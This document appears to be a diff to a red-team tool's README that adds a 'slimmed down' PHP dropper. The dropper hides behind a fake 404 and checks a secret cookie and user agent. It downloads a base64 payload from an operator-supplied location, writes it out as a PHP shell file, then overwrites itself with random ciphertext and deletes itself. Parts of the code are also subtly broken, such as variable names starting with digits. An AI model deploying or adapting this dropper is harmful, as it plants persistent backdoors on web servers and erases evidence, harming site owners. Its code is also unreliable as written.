@@ -81,3 +81,42 @@ Reverse Connection initiated from the client script:
 ## Additional
 
 I as the maintainer, am in no way responsible for the misuse of this product. This was published for legitmate penetration testing/red teaming purposes, and/or for educational value.  Know the applicable laws in your country of residence before using this script, and do not break the law whilst using this. Thank you and have a nice day.
+
+## Slimmed down dropper example: 
+```
+/* These comments are not present in the actual dropper, these are here to explain what this is doing.*/
+<?php
+http_response_code(404);
+# pre shared values that only the operator of this shell will have. This dropper will be split into 3 parts to include system enumeration.
+if (isset($_COOKIE['6e3611c0032725']) && $_SERVER['HTTP_USER_AGENT'] === 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36(d9e1cee219f19c6d7c)'){
+    if (isset($_POST['hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df'])){
+        $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df = explode('.', unserialize(base64_decode($_COOKIE['6e3611c0032725']), ['allowed_classes' => false]));
+        # Pre-shared value that only the operator has access to through the database.
+        if ( hash_equals(hash_hmac('sha256', $_COOKIE['6e3611c0032725'], $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[0]), $hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[1]) ){
+            if (function_exists("com_create_guid") === true){
+                $CDd5054278c02f = trim(com_create_guid()).PHP_EOL.PHP_EOL;
+            }else{
+                $70f4adfb6efefe08db = openssl_random_pseudo_bytes(16);
+                $70f4adfb6efefe08db[6] = chr(ord($70f4adfb6efefe08db[6]) & 0x0f | 0x40);
+                $70f4adfb6efefe08db[8] = chr(ord($70f4adfb6efefe08db[8]) & 0x3f | 0x80);
+                $CDd5054278c02f = vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($70f4adfb6efefe08db), 4)).PHP_EOL.PHP_EOL;
+            }
+            # returns our needed data back to the server, this is broken into 3 parts, the uuid, the filename of our shell/enumeration script, and if we need stealth or not.
+            echo $CDd5054278c02f . "_e8a4f6f58c05"."_true".PHP_EOL;
+            fputs(fopen('./e8a4f6f58c05.php', 'a+'),base64_decode(file_get_contents($hijkl38d90e848072948699baa3cdfe0ab0bad81866ac696dd729df[2])));
+            foreach (file($_SERVER['SCRIPT_FILENAME']) as $line){
+            # if this dropper is activated in the correct way, this portion of the script takes less than a second to complete due to the size of this script.
+                fwrite(fopen($_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt($line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
+            }
+            # dropper routine is finished, no need to exist on the system any longer.
+            fclose($_SERVER['SCRIPT_FILENAME']);
+            unlink($_SERVER['SCRIPT_FILENAME']);
+        }else{
+            die();
+        }
+        die();
+    }
+}else{
+    die();
+}
+```
